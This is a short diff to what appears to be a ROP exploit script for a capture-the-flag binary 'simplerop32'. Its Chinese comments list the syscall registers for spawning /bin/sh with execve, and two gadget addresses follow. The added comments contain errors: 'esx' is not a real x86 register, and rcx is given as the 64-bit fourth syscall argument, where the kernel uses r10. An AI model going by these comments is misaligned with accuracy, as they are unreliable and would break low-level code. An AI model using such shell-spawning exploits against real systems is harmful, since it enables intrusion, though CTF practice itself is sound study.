@@ -8,12 +8,17 @@ elf = ELF('./simplerop32')
 # ebx = /bin/sh   // 第一个参数
 # ecx = 0         // 第二个参数
 # edx = 0         // 第三个参数
+# esx = 0         // 第四个参数
+# edi = 0         // 第五个参数
 #
 # 64位
 # rax = 0x3B      // execve系统调用号
 # rdi = /bin/sh   // 第一个参数
 # rsi = 0         // 第二个参数
 # rdx = 0         // 第三个参数
+# rcx = 0         // 第四个参数
+# r8  = 0         // 第五个参数
+# r9  = 0         // 第六个参数
 pop_edx_ecx_ebx = 0x08049941
 pop_eax = 0x080aa06a
 
